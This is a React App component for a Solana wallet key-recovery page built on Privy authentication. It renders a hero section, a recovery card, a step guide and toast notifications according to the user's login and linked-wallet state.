import React, { useState } from 'react';
import { usePrivy } from '@privy-io/react-auth';
import Header from './components/Header';
import RecoveryCard from './components/RecoveryCard';
import StepGuide from './components/StepGuide';
import Toast from './components/Toast';

export function App() {
  const { authenticated, user } = usePrivy();
  const [toast, setToast] = useState({ message: '', type: 'success' });

  const hasSolanaWallet = Boolean(
    user?.linkedAccounts?.some(
      (acc) => acc.type === 'wallet' && acc.chainType === 'solana'
    )
  );

  let currentStep = 1;
  if (authenticated) {
    currentStep = hasSolanaWallet ? 3 : 2;
  }

  const showToast = (message, type = 'success') => {
    setToast({ message, type });
  };

  const closeToast = () => {
    setToast({ message: '', type: 'success' });
  };

  return (
    <div className="min-h-screen bg-[#fafafa] text-gray-900 flex flex-col font-sans">
      <Header />

      <main className="flex-1 max-w-3xl w-full mx-auto px-4 sm:px-6 py-10 flex flex-col gap-8">
        {/* Hero Section */}
        <section className="text-center space-y-3 pt-2">
          <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-gray-100 text-xs font-mono text-gray-700">
            <span className="w-1.5 h-1.5 rounded-full bg-gray-500"></span>
            <span>Privy v2 / 10k Recovery</span>
          </div>

          <h1 className="text-3xl sm:text-4xl font-extrabold text-gray-900 tracking-tight font-sans">
            Recover 10K Solana Wallet
          </h1>

          <p className="max-w-xl mx-auto text-xs sm:text-sm text-gray-500 font-sans leading-relaxed">
            Cryptographically decrypt and export your embedded 10k.world Solana private key using your connected Phantom wallet signature. No gas, fees, or on-chain transactions required.
          </p>
        </section>

        {/* Recovery Card */}
        <section className="w-full">
          <RecoveryCard
            onCopy={(msg) => showToast(msg, 'success')}
            onError={(msg) => showToast(msg, 'error')}
          />
        </section>

        {/* Recovery Instructions */}
        <section className="w-full">
          <StepGuide currentStep={currentStep} />
        </section>
      </main>

      <Toast
        message={toast.message}
        type={toast.type}
        onClose={closeToast}
      />
    </div>
  );
}

export default App;
